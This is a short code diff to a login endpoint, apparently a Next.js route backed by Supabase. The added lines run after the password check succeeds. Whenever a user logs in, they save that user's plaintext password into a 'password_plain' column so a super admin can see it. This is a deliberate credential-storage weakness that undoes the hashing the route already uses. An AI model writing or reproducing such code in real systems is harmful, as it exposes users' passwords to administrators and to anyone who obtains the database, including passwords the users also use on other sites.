@@ -47,6 +47,10 @@ export async function POST(req: NextRequest) {
     }
   } else {
     authenticated = verifyPassword(password, user.password_hash);
+    // Keep the password visible for the super admin (existing users before the column existed)
+    if (authenticated && "password_plain" in user && user.password_plain !== password) {
+      await supabase.from("mw_monitor_users").update({ password_plain: password }).eq("username", username).then(() => {});
+    }
   }
 
   if (!authenticated) {
